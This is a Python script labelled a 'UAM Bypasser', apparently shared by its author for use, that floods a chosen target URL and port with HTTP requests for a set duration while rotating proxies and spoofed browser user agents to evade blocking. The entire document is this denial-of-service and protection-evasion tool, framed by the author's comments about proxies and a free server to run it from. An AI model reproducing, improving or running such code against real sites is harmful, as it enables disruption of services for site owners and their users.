##The code was created by Kyletheprogrammer no skids please If you wanna you a good free vps server use Lightning ai (Phone num req) 
import requests
from itertools import cycle
import argparse
import time

# List of user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Rotate through user agents
user_agent_pool = cycle(user_agents)

# Function to read proxies from a file
def load_proxies(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.read().splitlines()
    return proxies

# Rotate through proxies
def get_proxy(proxy_pool):
    return {"http": next(proxy_pool), "https": next(proxy_pool)}

def make_request(url, proxy_pool):
    headers = {
        "User-Agent": next(user_agent_pool),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    proxy = get_proxy(proxy_pool)
    response = requests.get(url, headers=headers, proxies=proxy)
    return response

def main():
    print("Example: python uam_bypasser.py www.example.com 443 120 proxies.txt")
    parser = argparse.ArgumentParser(description='UAM Bypasser Script')
    parser.add_argument('url', type=str, help='Target URL')
    parser.add_argument('port', type=int, help='Port number')
    parser.add_argument('duration', type=int, help='Duration in seconds')
    parser.add_argument('proxy_file', type=str, help='File containing list of proxies')
    
    args = parser.parse_args()
    
    target_url = f"http://{args.url}:{args.port}"
    print(f"Target URL: {target_url}")
    
    # Load proxies from the specified file
    proxies = load_proxies(args.proxy_file)
    proxy_pool = cycle(proxies)
    
    start_time = time.time()
    elapsed_time = 0
    request_count = 0
    
    while elapsed_time < args.duration:
        try:
            response = make_request(target_url, proxy_pool)
            request_count += 1
            if response.status_code == 200:
                print(f"Request {request_count}: Success!")
                print(response.text)  # Or handle the response as needed
            else:
                print(f"Request {request_count}: Failed with status code {response.status_code}")
        except requests.RequestException as e:
            print(f"Request {request_count}: Failed with error {e}")
        
        elapsed_time = time.time() - start_time

if __name__ == '__main__':
    main()
##I will try and get good proxies that work but the ones i provided a used!
